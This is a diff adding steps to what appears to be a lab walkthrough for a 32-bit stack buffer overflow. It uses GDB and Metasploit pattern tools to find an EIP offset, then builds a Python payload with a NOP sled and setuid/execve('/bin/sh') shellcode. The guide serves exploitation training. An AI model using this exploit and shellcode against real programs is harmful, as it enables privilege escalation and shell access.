@@ -49,5 +49,49 @@ disass main
 //Step 5.2 Place a breakpoint at this location in GDB by using the commmand:
 b 0x080491a1
 
-//
+//Step 5.3 When prompted about the break point just say 'yes' (y)
+
+//Step 6 Overflow the buffer in GDB by using the command:
+run $(msf-pattern_create -l 500)
+/note that the -l (is a lower-case 'L' and indicates lenght)
+/you should come across a 'program received signal SIGSEGV, Segmentation fault.
+
+//Step 6.1 Check the EIP with the command:
+info registers
+/for me the eip was -0x6c41376c
+
+//Step 7 Finding the offset
+/open a new terminal
+/enter the following command to find the offset for eip return address:
+msf-pattern_offset -l 500 -q /for me the eip was -0x6c41376c
+/for me the exact offset was at 352
+
+//Step 8 overwriting the EIP return address.
+/enter the following command to check your offset lets you overwrite EIP return address:
+run $(python2.7 -c "print('A'*352 + 'B' * 4 + 'Z'*144)")
+/note the EIP address is 4 bytes
+
+//Step 9 making the actual payload and NOP sled
+/Step 9.1 make a .py file using Nano
+/Step 9.2 Copy+paste the following code into it:
+---
+#!/usr/bin/python 
+
+nopsled = '\x90' * 64 
+shellcode = (
+'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
+'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
+'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
+)
+padding = 'A' * (352 - 64 - 32)
+paddingZ = 'Z' * (500-352-4)
+eip = '1234'
+print nopsled + shellcode + padding + eip + paddingZ
+---
+/PLEASE NOTE THAT THE EXAMPLE SHELLCODE IS 32 BYTES!
+
+
+
+
+
 
